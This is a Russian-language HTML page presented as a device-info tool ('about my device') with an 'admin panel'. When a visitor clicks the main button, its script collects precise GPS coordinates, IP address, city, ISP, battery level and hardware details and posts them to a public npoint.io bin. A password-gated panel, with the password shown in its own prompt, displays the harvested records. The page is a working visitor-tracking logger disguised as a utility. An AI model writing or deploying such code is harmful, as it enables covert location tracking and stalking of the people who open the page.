<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Admin Panel</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #020617; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .box { background: #1e293b; padding: 25px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
        h2 { color: #38bdf8; margin-bottom: 20px; text-transform: uppercase; font-size: 1.2rem; }
        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 13px; }
        .btn-blue { background: #0284c7; color: white; }
        .btn-green { background: #10b981; color: white; }
        .btn-red { background: #ef4444; color: white; margin-top: 20px; }
        #status { font-size: 11px; color: #94a3b8; margin: 10px 0; }
        #results { margin-top: 20px; text-align: left; background: #000; padding: 15px; border-radius: 12px; display: none; max-height: 400px; overflow-y: auto; border: 1px solid #1e293b; font-size: 11px; }
        .entry { border-bottom: 1px solid #1e293b; padding: 12px 0; line-height: 1.6; }
        .entry b { color: #38bdf8; }
        hr { border: 0; border-top: 1px solid #334155; margin: 10px 0; }
    </style>
</head>
<body>

<div class="box">
    <h2>System Intelligence</h2>
    <button class="btn-blue" id="mainBtn" onclick="fullScan()">О МОЕМ УСТРОЙСТВЕ</button>
    <button class="btn-green" onclick="viewLogs()">ПАНЕЛЬ УПРАВЛЕНИЯ</button>
    <div id="status">Система готова</div>
    <div id="results"></div>
    <button class="btn-red" id="clearBtn" onclick="clearDatabase()" style="display:none;">ОЧИСТИТЬ ВСЮ ПАМЯТЬ БАЗЫ</button>
</div>

<script>
    const BIN_ID = "970512ab12c9b4a48cfd"; // Твой ID
    const API_URL = `https://api.npoint.io/${BIN_ID}`;

    async function fullScan() {
        const status = document.getElementById('status');
        status.innerText = "Сканирование системы...";
        
        let data = {
            date: new Date().toLocaleString("ru-RU"),
            gps: "Нет доступа",
            battery: "Загрузка...",
            network: {},
            hardware: {}
        };

        // 1. Точный GPS
        const getGPS = () => new Promise(r => {
            navigator.geolocation.getCurrentPosition(
                p => r(`${p.coords.latitude}, ${p.coords.longitude} (Точность: ${p.coords.accuracy}м)`),
                () => r("Запрещено пользователем"),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
        data.gps = await getGPS();

        // 2. Батарея
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Разрядка'})`;
        }

        // 3. Сеть и IP
        try {
            const res = await fetch('https://ipapi.co/json/');
            const json = await res.json();
            data.network = { ip: json.ip, city: json.city, isp: json.org };
        } catch(e) { data.network = { ip: "Ошибка" }; }

        // 4. Железо
        data.hardware = {
            os: navigator.platform,
            cores: navigator.hardwareConcurrency || "Неизвестно",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Неизвестно",
            screen: `${window.screen.width}x${window.screen.height}`,
            ua: navigator.userAgent
        };

        // 5. Сохранение
        try {
            const getDb = await fetch(API_URL);
            let db = await getDb.json();
            if (!Array.isArray(db)) db = [];
            db.push(data);

            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(db)
            });
            status.innerText = "Данные успешно переданы!";
            alert("Данные устройства сохранены в облако!");
        } catch(e) {
            status.innerText = "Ошибка соединения";
        }
    }

    async function viewLogs() {
        const pass = prompt("Введите пароль администратора (3664):");
        if (pass !== "3664") return;

        document.getElementById('clearBtn').style.display = 'block';
        const resDiv = document.getElementById('results');
        resDiv.style.display = 'block';
        resDiv.innerHTML = "Загрузка логов...";

        try {
            const res = await fetch(API_URL);
            const logs = await res.json();
            if(!logs.length) return resDiv.innerHTML = "База пуста";

            resDiv.innerHTML = logs.reverse().map((l, i) => `
                <div class="entry">
                    <b>ЗАПИСЬ #${logs.length - i}</b><br>
                    📅 ${l.date}<br>
                    📍 <b>GPS:</b> ${l.gps}<br>
                    🌐 <b>IP:</b> ${l.network.ip} (${l.network.city})<br>
                    🏢 <b>Провайдер:</b> ${l.network.isp}<br>
                    🔋 <b>Батарея:</b> ${l.battery}<br>
                    💻 <b>Железо:</b> ${l.hardware.os}, ${l.hardware.cores} ядер, ${l.hardware.ram} RAM<br>
                    📏 <b>Экран:</b> ${l.hardware.screen}
                </div>
            `).join('');
        } catch(e) { resDiv.innerHTML = "Ошибка чтения."; }
    }

    async function clearDatabase() {
        if (!confirm("Вы уверены, что хотите УДАЛИТЬ ВСЕ данные из облака?")) return;
        try {
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify([])
            });
            alert("База данных полностью очищена!");
            location.reload();
        } catch(e) { alert("Ошибка очистки."); }
    }
</script>

</body>
</html>
